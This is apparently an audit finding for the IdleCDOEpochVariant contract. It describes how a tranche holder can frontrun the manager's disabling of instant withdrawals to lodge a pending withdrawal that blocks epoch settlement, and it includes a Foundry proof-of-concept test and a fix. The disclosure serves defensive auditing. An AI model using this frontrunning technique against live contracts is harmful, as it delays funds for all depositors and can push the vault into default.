### Title
Disabling instant withdrawals can be frontrun to create a pending withdrawal that blocks epoch settlement - (File: `contracts/IdleCDOEpochVariant.sol`)

### Summary
A tranche holder can monitor the mempool for `setInstantWithdrawParams(..., true)` and submit `requestWithdraw` first. If the APR decrease satisfies the instant-withdraw condition, the request is recorded before instant withdrawals are disabled. The resulting `pendingInstantWithdraws` must later be funded before the epoch can be stopped.

### Finding Description
`setInstantWithdrawParams` only changes `disableInstantWithdraw`; it does not invalidate an instant withdrawal submitted in an earlier transaction in the same block [1](#0-0) . During the buffer period, `requestWithdraw` creates an instant receipt when the previous APR exceeds the new APR by `instantWithdrawAprDelta` [2](#0-1) .

After the next epoch starts, any unfunded instant balance is retained by the strategy [3](#0-2) . `stopEpoch` explicitly reverts while that balance remains nonzero [4](#0-3) .

### Impact Explanation
For an attacker-controlled balance `X`, a successfully ordered request creates an `X`-underlying obligation that the manager intended to prevent. If the vault has insufficient cash at `startEpoch`, all epoch settlement is temporarily blocked until the borrower supplies `X` through `getInstantWithdrawFunds`. This can delay settlement for all depositors by at least `instantWithdrawDelay`; if funding ultimately fails, the vault enters default.

### Likelihood Explanation
The attacker needs a KYC-approved wallet and an existing tranche balance. The manager must broadcast a transaction that disables instant withdrawals while the APR condition permits one. The attacker does not need privileged access or control over the borrower.

### Recommendation
Make policy changes atomic with respect to pending requests. For example, add a request-generation number and disable only requests created after the policy change, or require `setInstantWithdrawParams(..., true)` to execute in the same transaction that stops the epoch and sets the next APR. Alternatively, document that pending transactions remain governed by the policy observed at their execution time.

### Proof of Concept

```solidity
// test/foundry/IdleCreditVault.t.sol
function testFrontrunDisableInstantWithdrawBlocksStopEpoch() external {
    // Standard fixed-APR mode with instant withdrawals enabled.
    vm.prank(manager);
    cdoEpoch.setInstantWithdrawParams(100, 1e18, false);

    uint256 amount = 10_000 * ONE_SCALE;
    address attacker = makeAddr("attacker");
    _depositWithUser(attacker, amount, true);

    // Complete an epoch and lower the next APR enough to satisfy the
    // instant-withdraw APR delta.
    _startEpochAndCheckPrices(0);
    _stopEpochAndCheckPrices(0, initialProvidedApr / 4, _expectedFundsEndEpoch());

    uint256 attackerTranches = AAtranche.balanceOf(attacker);

    // Mempool ordering: the user's request executes before the manager's
    // disabling transaction.
    vm.prank(attacker);
    uint256 requested = cdoEpoch.requestWithdraw(
        attackerTranches,
        address(AAtranche)
    );

    vm.prank(manager);
    cdoEpoch.setInstantWithdrawParams(100, 1e18, true);

    assertEq(
        IdleCreditVault(address(strategy)).instantWithdrawsRequests(attacker),
        requested,
        "instant request was not recorded"
    );

    // The pending request survives the later disabling transaction.
    _startEpochAndCheckPrices(1);
    assertEq(
        strategy.pendingInstantWithdraws(),
        requested,
        "pending instant amount changed"
    );

    // Until the borrower funds this request, stopping the epoch is impossible.
    vm.warp(cdoEpoch.epochEndDate() + 1);
    vm.prank(manager);
    vm.expectRevert(abi.encodeWithSelector(NotAllowed.selector));
    cdoEpoch.stopEpoch(initialProvidedApr, 0);
}
```

### Citations

**File:** contracts/IdleCDOEpochVariant.sol (L131-136)
```text
  function setInstantWithdrawParams(uint256 _delay, uint256 _aprDelta, bool _disable) public virtual {
    _checkOnlyOwnerOrManager();
    _checkNotAllowed(paused());
    instantWithdrawDelay = _delay;
    instantWithdrawAprDelta = _aprDelta;
    disableInstantWithdraw = _disable;
```

**File:** contracts/IdleCDOEpochVariant.sol (L279-289)
```text
    uint256 pendingInstant = _pendingInstant();
    uint256 totUnderlyings = _contractTokenBalance(token);
    uint256 _pendingWithdraws = _strategy.pendingWithdraws();
    _strategy.collectInstantWithdrawFunds(pendingInstant > totUnderlyings ? totUnderlyings : pendingInstant);

    // if there are more requests than the current underlyings we simply send all underlyings
    // to the IdleCreditVault contract
    if (pendingInstant > totUnderlyings) {
      // if borrower is programmable, notify epoch start even if no funds were sent
      _startEpochProgrammableBorrower(_pendingWithdraws);
      return;
```

**File:** contracts/IdleCDOEpochVariant.sol (L338-345)
```text
    _checkNotAllowed(
      // Check that epoch is running
      !isEpochRunning || 
      // Check that end date is passed
      block.timestamp < epochEndDate || 
      // Check that there are no pending instant withdraws, ie `getInstantWithdrawFunds` was called
      // before closing the epoch
      _pendingInstant() != 0 ||
```

**File:** contracts/IdleCDOEpochVariant.sol (L761-768)
```text
    if (_isInstantWithdrawEnabled()) {
      uint256 currentApr = creditVault.unscaledApr();
      if (lastEpochApr > (currentApr + instantWithdrawAprDelta)) {
        // burn strategy tokens from cdo and mint an equal amount to msg.sender as receipt
        creditVault.requestInstantWithdraw(_underlyings, msg.sender);
        // burn tranche tokens and decrease NAV
        _withdrawOps(_amount, _underlyings, _tranche);
        return _underlyings;
```
